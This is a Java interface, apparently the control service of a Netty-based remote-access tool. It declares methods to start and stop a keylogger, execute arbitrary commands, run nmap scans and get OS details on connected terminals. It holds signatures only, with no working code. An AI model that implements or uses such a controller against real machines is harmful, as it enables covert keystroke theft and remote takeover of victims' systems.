package service;


import io.netty.channel.Channel;
import io.netty.channel.ChannelId;
import io.netty.channel.group.ChannelGroup;

public interface ControlServiceImp {


    void init() throws InterruptedException;

    void sendMesgToTerminal(Channel channel, String msg);

    Channel getChannel(ChannelId id, ChannelGroup group);

    void sendMesg(String terminalId, String msg);

    ChannelId findChannelIdFromTerminalId(long terminalId);

    boolean runNmap(String terminalID);

    String runGetos(String terminalID);

    String getGetos(String terminalID);

    String startKeyLogger(String terminalID);

    String overKeyLogger(String terminalID);

    String execCmdCommand(String terminalID, String msg);

    String getNmapInfos(String terminalID);


}
